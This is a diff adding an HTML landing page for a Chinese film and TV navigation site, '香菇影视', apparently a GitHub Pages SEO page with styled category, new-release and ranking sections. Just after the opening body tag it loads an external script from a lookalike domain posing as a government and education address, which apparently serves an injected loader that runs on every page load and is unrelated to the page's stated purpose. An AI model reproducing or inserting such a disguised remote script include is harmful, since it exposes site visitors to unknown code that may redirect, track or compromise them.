@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>香菇影视 - 高清电影电视剧在线导航 | xiangguyingshi-h5.github.io</title>
+<meta name="description" content="香菇影视（xiangguyingshi-h5.github.io）提供最新高清电影、电视剧、动漫、综艺在线观看导航。每日更新，界面清新，支持手机与电脑自适应访问。">
+<meta name="keywords" content="香菇影视, 电影在线观看, 电视剧导航, 免费影视, xiangguyingshi-h5">
+<meta name="author" content="香菇影视">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --paper:#f6f1e7;
+    --paper2:#efe7d6;
+    --brown:#6b4f3a;
+    --brown-d:#4a3526;
+    --spore:#5b8c6e;
+    --spore-d:#3f6b52;
+    --cap:#d9663f;
+    --line:#d8ccb4;
+    --text:#3a2c20;
+    --muted:#8a755f;
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{
+    font-family:var(--sans);
+    background:var(--paper);
+    color:var(--text);
+    line-height:1.65;
+    /* 轻微纸纹 */
+    background-image:radial-gradient(#00000008 1px,transparent 1px);
+    background-size:18px 18px;
+  }
+  a{color:var(--spore-d);text-decoration:none;transition:.2s;}
+  a:hover{color:var(--cap);}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 1.2rem;}
+
+  /* 顶栏 */
+  .topbar{
+    border-bottom:2px solid var(--brown);
+    background:var(--paper2);
+    position:sticky;top:0;z-index:50;
+  }
+  .topbar-in{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:.9rem 1.2rem;max-width:1080px;margin:0 auto;
+  }
+  .brand{display:flex;align-items:center;gap:.5rem;font-weight:900;font-size:1.35rem;color:var(--brown-d);}
+  .brand .cap-ico{
+    width:26px;height:26px;border-radius:50% 50% 45% 45%;
+    background:var(--cap);position:relative;flex:none;
+  }
+  .brand .cap-ico::after{
+    content:"";position:absolute;left:50%;bottom:-5px;transform:translateX(-50%);
+    width:14px;height:8px;background:var(--paper2);border-radius:0 0 6px 6px;
+  }
+  .nav{display:flex;gap:1.1rem;font-size:.9rem;font-weight:600;}
+  .nav a{padding:.2rem .4rem;}
+  .nav a:hover{background:#00000008;}
+
+  /* 通用栏目 */
+  section{padding:3.5rem 0;border-bottom:1px dashed var(--line);}
+  .sec-tag{
+    display:inline-block;font-size:.72rem;letter-spacing:2px;
+    color:var(--spore-d);border:1px solid var(--spore);
+    padding:.1rem .6rem;border-radius:20px;margin-bottom:.6rem;
+  }
+  h2.sec-title{font-size:clamp(1.6rem,4vw,2.4rem);color:var(--brown-d);margin-bottom:2rem;letter-spacing:-.5px;}
+
+  /* 栏目1：Hero */
+  #home{padding-top:4rem;}
+  .hero{display:grid;grid-template-columns:1.4fr .8fr;gap:2.5rem;align-items:center;}
+  .hero h1{font-size:clamp(2.4rem,6vw,4rem);line-height:1.05;color:var(--brown-d);letter-spacing:-1px;}
+  .hero h1 em{color:var(--cap);font-style:normal;}
+  .hero p.lead{margin:1.2rem 0;color:var(--muted);max-width:520px;}
+  .hero-meta{display:flex;gap:1.5rem;font-size:.85rem;color:var(--brown);margin-top:1rem;}
+  .hero-meta b{display:block;font-size:1.1rem;color:var(--spore-d);}
+  .signboard{
+    background:var(--paper2);border:2px solid var(--brown);
+    border-radius:18px;padding:2rem;text-align:center;
+    box-shadow:6px 6px 0 var(--line);
+  }
+  .big-mush{
+    width:90px;height:90px;margin:0 auto 1rem;
+    border-radius:50% 50% 45% 45%;
+    background:linear-gradient(var(--cap),#c0532f);
+    position:relative;
+  }
+  .big-mush::before{
+    content:"";position:absolute;inset:0;
+    background-image:radial-gradient(#fff6 4px,transparent 5px);
+    background-size:18px 18px;border-radius:inherit;opacity:.7;
+  }
+  .big-mush::after{
+    content:"";position:absolute;left:50%;bottom:-26px;transform:translateX(-50%);
+    width:34px;height:30px;background:var(--paper);border:2px solid var(--brown);border-radius:0 0 14px 14px;
+  }
+  .signboard span{font-size:.85rem;color:var(--muted);}
+
+  /* 栏目2：木架分类 */
+  #category .shelf{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;
+  }
+  .cell{
+    background:var(--paper2);border:1px solid var(--line);
+    border-radius:14px;padding:1.1rem 1rem;position:relative;
+    box-shadow:3px 3px 0 #0000000a;
+  }
+  .cell::before{
+    content:"";position:absolute;top:10px;right:12px;
+    width:8px;height:8px;border-radius:50%;
+    background:var(--spore);box-shadow:14px 4px 0 var(--cap),-6px 10px 0 var(--brown);
+    opacity:.5;
+  }
+  .cell h3{font-size:1.05rem;color:var(--brown-d);margin-bottom:.3rem;}
+  .cell p{font-size:.8rem;color:var(--muted);}
+
+  /* 栏目3：货架上新 */
+  #latest .goods{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1.2rem;
+  }
+  .item{
+    background:var(--paper2);border:1px solid var(--line);
+    border-radius:14px;overflow:hidden;
+  }
+  .poster{
+    height:150px;display:flex;align-items:center;justify-content:center;
+    font-size:3rem;
+    background:linear-gradient(135deg,#e7dcc4,#d8c7a6);
+    border-bottom:1px solid var(--line);
+  }
+  .item h3{font-size:.95rem;padding:.7rem .8rem 0;color:var(--brown-d);}
+  .item .date{font-size:.72rem;color:var(--spore-d);padding:.2rem .8rem 0;}
+  .item .type{font-size:.72rem;color:var(--muted);padding:.2rem .8rem .8rem;}
+
+  /* 栏目4：煲剧榜 */
+  #ranking .rank-list{max-width:680px;}
+  .rank-row{
+    display:flex;align-items:center;gap:1rem;
+    padding:1rem;border-bottom:1px solid var(--line);
+  }
+  .rank-row:last-child{border-bottom:none;}
+  .stamp{
+    flex:none;width:38px;height:38px;border-radius:8px;
+    background:var(--cap);color:#fff;font-weight:900;
+    display:flex;align-items:center;justify-content:center;
+    transform:rotate(-4deg);box-shadow:2px 2px 0 var(--brown);
+  }
+  .stamp.n{background:var(--spore);}
+  .rk-info h3{font-size:1rem;color:var(--brown-d);}
+  .rk-info span{font-size:.78rem;color:var(--muted);}
+  .rk-heat{margin-left:auto;font-family:monospace;font-size:.85rem;color:var(--cap);}
+
+  /* 栏目5：说明 */
+  #about .note{
+    background:var(--paper2);border:1px solid var(--line);
+    border-left:4px solid var(--spore);
+    border-radius:10px;padding:1.4rem;font-size:.9rem;color:var(--muted);
+  }
+  #about .note b{color:var(--brown-d);}
+  .url-line{font-family:monospace;color:var(--spore-d);margin-top:.8rem;}
+
+  footer{
+    text-align:center;padding:2.5rem 1rem;font-size:.82rem;color:var(--muted);
+  }
+  footer a{color:var(--cap);}
+
+  /* 移动端 */
+  @media(max-width:768px){
+    .nav{display:none;}
+    .hero{grid-template-columns:1fr;gap:1.5rem;}
+    .signboard{order:-1;}
+    #category .shelf{grid-template-columns:1fr 1fr;}
+    #latest .goods{grid-template-columns:1fr 1fr;}
+    .poster{height:120px;font-size:2.2rem;}
+    .rk-heat{display:none;}
+  }
+  @media(max-width:420px){
+    #category .shelf{grid-template-columns:1fr;}
+    #latest .goods{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brand"><span class="cap-ico"></span>香菇影视</div>
+    <nav class="nav">
+      <a href="#home">林口</a>
+      <a href="#category">木架</a>
+      <a href="#latest">上新</a>
+      <a href="#ranking">煲剧榜</a>
+      <a href="#about">说明</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="hero">
+      <div>
+        <span class="sec-tag">FOREST STREAM</span>
+        <h1>香菇影视<em>·林间放映</em></h1>
+        <p class="lead">香菇影视（xiangguyingshi-h5.github.io）像一片雨后的菌菇林，把电影、剧集、动漫、综艺整齐摆在木架上，打开即看，不吵不挤。</p>
+        <div class="hero-meta">
+          <div><b>每日</b>资源上新</div>
+          <div><b>4+</b>内容频道</div>
+          <div><b>H5</b>手机自适应</div>
+        </div>
+      </div>
+      <div class="signboard">
+        <div class="big-mush"></div>
+        <span>今日菌子已冒头 🍄</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="category">
+    <span class="sec-tag">SHELF</span>
+    <h2 class="sec-title">木架分类</h2>
+    <div class="shelf">
+      <div class="cell"><h3>电影库</h3><p>院线新片 / 经典老片</p></div>
+      <div class="cell"><h3>国产剧集</h3><p>古装 / 现代 / 悬疑</p></div>
+      <div class="cell"><h3>欧美剧场</h3><p>美剧 / 英剧 / 科幻</p></div>
+      <div class="cell"><h3>日韩专区</h3><p>韩剧 / 日剧 / 番剧</p></div>
+      <div class="cell"><h3>动漫番剧</h3><p>连载 / 完结 / 剧场版</p></div>
+      <div class="cell"><h3>综艺现场</h3><p>真人秀 / 访谈 / 选秀</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="latest">
+    <span class="sec-tag">FRESH</span>
+    <h2 class="sec-title">货架上新</h2>
+    <div class="goods">
+      <article class="item">
+        <div class="poster">🏜️</div>
+        <h3>沙丘3：救世主</h3>
+        <div class="date">上新 2026-10-21</div>
+        <div class="type">科幻 / 电影</div>
+      </article>
+      <article class="item">
+        <div class="poster">👑</div>
+        <h3>庆余年2</h3>
+        <div class="date">上新 2026-10-20</div>
+        <div class="type">古装权谋 / 剧集</div>
+      </article>
+      <article class="item">
+        <div class="poster">🔥</div>
+        <h3>周处除三害</h3>
+        <div class="date">上新 2026-10-19</div>
+        <div class="type">动作犯罪 / 电影</div>
+      </article>
+      <article class="item">
+        <div class="poster">🏎️</div>
+        <h3>飞驰人生2</h3>
+        <div class="date">上新 2026-10-18</div>
+        <div class="type">喜剧 / 电影</div>
+      </article>
+      <article class="item">
+        <div class="poster">⚔️</div>
+        <h3>咒术回战 S3</h3>
+        <div class="date">上新 2026-10-17</div>
+        <div class="type">热血 / 动漫</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="ranking">
+    <span class="sec-tag">HOT LIST</span>
+    <h2 class="sec-title">今日煲剧榜</h2>
+    <div class="rank-list">
+      <div class="rank-row">
+        <div class="stamp">1</div>
+        <div class="rk-info"><h3>繁花</h3><span>国产剧 / 王家卫美学</span></div>
+        <div class="rk-heat">98°</div>
+      </div>
+      <div class="rank-row">
+        <div class="stamp">2</div>
+        <div class="rk-info"><h3>庆余年2</h3><span>古装 / 权谋喜剧</span></div>
+        <div class="rk-heat">95°</div>
+      </div>
+      <div class="rank-row">
+        <div class="stamp n">3</div>
+        <div class="rk-info"><h3>周处除三害</h3><span>动作 / 犯罪</span></div>
+        <div class="rk-heat">92°</div>
+      </div>
+      <div class="rank-row">
+        <div class="stamp n">4</div>
+        <div class="rk-info"><h3>热辣滚烫</h3><span>励志 / 喜剧</span></div>
+        <div class="rk-heat">87°</div>
+      </div>
+      <div class="rank-row">
+        <div class="stamp n">5</div>
+        <div class="rk-info"><h3>极限挑战10</h3><span>综艺 / 真人秀</span></div>
+        <div class="rk-heat">83°</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="about">
+    <span class="sec-tag">NOTICE</span>
+    <h2 class="sec-title">站点说明</h2>
+    <div class="note">
+      <p><b>香菇影视</b>为影视资源导航单页，仅做分类索引与入口整理，不托管视频文件本体，也不内置播放器源码。</p>
+      <p>页面内容用于个人学习与交流导航；实际播放请通过正规授权平台，遵守当地网络与版权规范。</p>
+      <div class="url-line">🌐 https://xiangguyingshi-h5.github.io</div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  香菇影视 / xiangguyingshi-h5.github.io<br>
+  © 2026 林间放映 · 单页导航演示
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+</script>
+</body>
+</html>
